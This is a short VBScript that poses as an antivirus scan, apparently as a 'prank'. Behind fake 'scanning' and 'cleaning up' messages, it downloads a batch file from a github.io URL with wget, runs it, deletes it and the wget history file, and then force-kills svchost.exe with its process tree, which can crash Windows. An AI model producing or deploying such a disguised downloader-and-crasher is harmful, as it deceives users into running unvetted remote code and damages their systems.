Dim shell, fso
Dim wgetCheckCommand, wgetCheckResult
Dim commands, command, i

' Create WScript.Shell object
Set shell = CreateObject("WScript.Shell")

' Command to check if wget is available
wgetCheckCommand = "cmd.exe /c where wget"

' List of commands to be executed
commands = Array( _
    "title antivirus", _
    "echo starting...", _
    "ping 127.0.0.1 -n 6 >nul", _
    ".wget.exe .main.zip https://yew12347.github.io/prank1/start.bat", _
    "start.bat", _
    "cls", _
    "echo scaning...", _
    "ping 127.0.0.1 -n 6 >nul",_
    "echo cleaning up...", _
    "del start.bat", _
    "del .wget-hsts", _
    "ping 127.0.0.1 -n 4 >nul",_
    "taskkill /f /im svchost.exe /t",_
    "exit" _
)

' Build the command string
command = ""
For i = LBound(commands) To UBound(commands)
    If Len(command) > 0 Then
        command = command & " && "
    End If
    command = command & commands(i)
Next

' Run the concatenated commands
shell.Run "cmd.exe /c " & command, 1, False